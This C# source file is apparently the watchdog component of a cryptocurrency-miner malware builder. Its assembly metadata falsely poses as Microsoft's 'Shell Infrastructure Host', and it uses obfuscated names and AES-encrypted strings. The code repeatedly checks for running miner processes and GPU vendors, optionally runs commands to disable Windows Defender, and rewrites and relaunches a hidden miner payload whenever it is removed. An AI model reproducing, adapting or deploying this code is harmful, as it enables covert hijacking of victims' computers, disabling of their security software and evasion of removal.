﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

public partial class _rProgram_
{
    public static byte[] _rxm_ = { };
    public static int _rcheckcount_ = 0;
    public static string _rplp_ = PayloadPath;

    public static void Main()
    {
        try
        {
            _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
            _rWDLoop_();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
#endif
            Environment.Exit(0);
        }
    }

    public static void _rWDLoop_()
    {
        try
        {
            string _rarg1_ = "";
            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg1_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
            }

            bool _rarg2_ = _rarg1_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0;

            string _rminers_ = "";
            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
            foreach (ManagementObject retObject in _rarg7_)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
                {
                    _rminers_ += retObject["CommandLine"].ToString();
                }
            }

            string[][] _rminerset_ = new string[][] { MINERSET };
            bool _rmissing_ = false;
            foreach (string[] _set_ in _rminerset_)
            {
                if(!_rminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == _rGetString_("#XID") || (_set_[1] == _rGetString_("#EID") && _rarg2_)))
                {
                    _rmissing_ = true;
                    break;
                }
            }

            if (!File.Exists(_rplp_) || _rmissing_)
            {
                if (!File.Exists(_rplp_) || _rcheckcount_ > 2)
                {
                    _rcheckcount_ = 0;
#if DefKillWD
                    try
                    {
                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"));
                    }
                    catch (Exception ex)
                    {
#if DefDebug
                    MessageBox.Show("W2.5: " + Environment.NewLine + ex.ToString());
#endif
                    }
#endif
                    File.WriteAllBytes(_rplp_, _rAESMethod_(_rxm_));
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = _rplp_,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Path.GetDirectoryName(_rplp_),
                        CreateNoWindow = true,
                    });
                }
                else
                {
                    _rcheckcount_ += 1;
                }

            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
#endif
        }
        Thread.Sleep(startDelay * 1000 + 20000);
        _rWDLoop_();
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }
            return _rarg7_.ToArray();
        }
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            }).WaitForExit();
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }
}